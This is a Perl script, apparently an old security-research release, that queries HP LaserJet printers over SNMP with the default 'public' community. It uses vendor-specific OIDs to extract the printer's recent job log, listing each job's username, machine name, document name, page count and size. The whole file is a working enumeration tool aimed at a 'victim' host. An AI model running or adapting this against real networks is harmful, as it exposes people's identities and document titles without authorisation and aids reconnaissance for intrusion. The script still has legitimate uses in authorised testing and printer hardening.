#!/usr/bin/perl
###################################
#
# HP LaserJet SNMP User name enumeration tool v0.2 by
# Pinion Labs 050705
# george[46]hedfors[64]pinion[46]se
# http://www.pinion.se
#
# Description
# HP LaserJet printers loggs recent printed documents with
# timestamp, size, number of pages, username and machine name.
# These can be extracted using a specially crafted SNMP Object ID.
#
# Document name under 1.3.6.1.4.1.11.2.3.9.4.2.1.1.6.5.1
# Document pages under 1.3.6.1.4.1.11.2.3.9.4.2.1.1.6.5.12
# Document size under 1.3.6.1.4.1.11.2.3.9.4.2.1.1.6.5.14
# Usernames are found under 1.3.6.1.4.1.11.2.3.9.4.2.1.1.6.5.23.1
# Machine names under 1.3.6.1.4.1.11.2.3.9.4.2.1.1.6.5.23.2
#
# Output format
# DocID:Username:Machine:Pages:Size:DocName
#
#

use Net::SNMP;

# Number of errors in row that is tolerated before exit
$tolerance = 10;
# Default SNMP community to use
$defcommunity = "public";
# Default SNMP port to use
$defport = 161;

## END OF CONFIG ##

$host = $ARGV[0] || die "syntax: $0 victim.com \[community\] ".
                             "\[startid\]\n";
$community = $ARGV[1] || $defcommunity;
$startid = $ARGV[2] || 0;

($session, $error) = Net::SNMP->session(-hostname => $host,
                                        -community => $community,
                                        -port => $defport);

if (!defined($session)) {
 printf("ERROR: %s.\n", $error);
 exit 1;
}

for($i = $startid; $err < $tolerance; $i++) {
 $oid = "1.3.6.1.4.1.11.2.3.9.4.2.1.1.6.5.23.1.$i.0";
 $result = $session->get_request(-varbindlist => [$oid]);

 if (!defined($result)) {
  if($found > 0) {
   $err++;
  }
 } else {
  $found++;

  ($null, $user) = split(/\=/, $result->{$oid}, 2);

  $oid = "1.3.6.1.4.1.11.2.3.9.4.2.1.1.6.5.23.2.$i.0";
  $result = $session->get_request(-varbindlist => [$oid]);
  ($null, $id) = split(/\=/, $result->{$oid}, 2);

  $oid = "1.3.6.1.4.1.11.2.3.9.4.2.1.1.6.5.1.$i.0";
  $result = $session->get_request(-varbindlist => [$oid]);
  $doc = hex2ascii($result->{$oid});

  $oid = "1.3.6.1.4.1.11.2.3.9.4.2.1.1.6.5.12.$i.0";
  $result = $session->get_request(-varbindlist => [$oid]);
  $pages = $result->{$oid};

  $oid = "1.3.6.1.4.1.11.2.3.9.4.2.1.1.6.5.14.$i.0";
  $result = $session->get_request(-varbindlist => [$oid]);
  $size = $result->{$oid};

  printf("%d:%s:%s:%s:%s:%s\n", $i, $user, $id, $pages, $size, $doc);

  $err = 0;
 }
}

$session->close;

exit 0;

sub hex2ascii() {
 my $hex = shift;
 my $asc;

  for($n = 6; $n < length($hex); $n += 2) {
  $asc .= chr(hex(substr($hex, $n, 2)));
 }

 return $asc;
}